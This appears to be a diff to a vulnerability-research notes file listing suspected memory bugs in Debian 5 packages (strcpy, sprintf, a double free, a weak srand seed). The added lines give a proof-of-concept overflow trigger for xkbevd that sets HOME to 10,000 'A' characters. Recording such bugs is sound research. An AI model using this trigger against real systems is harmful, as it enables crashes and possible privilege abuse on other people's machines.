@@ -8,6 +8,10 @@ Debian5 - ccontrol - strcpy(configname, getenv("HOME"));
 
 Debian5 - gmond/ganglia-monitor - srand(1)
 
+Debian5 - x11-xkb-utils - xkbevd - sprintf getenv("HOME")
+	export HOME=$(perl -e 'print "A" x 10000')
+	xkbevd
+
 Debian5 - courier/maildiracl - double free maildiraclt.c
 
         p=malloc(strlen(maildir)+strlen(path)+2);
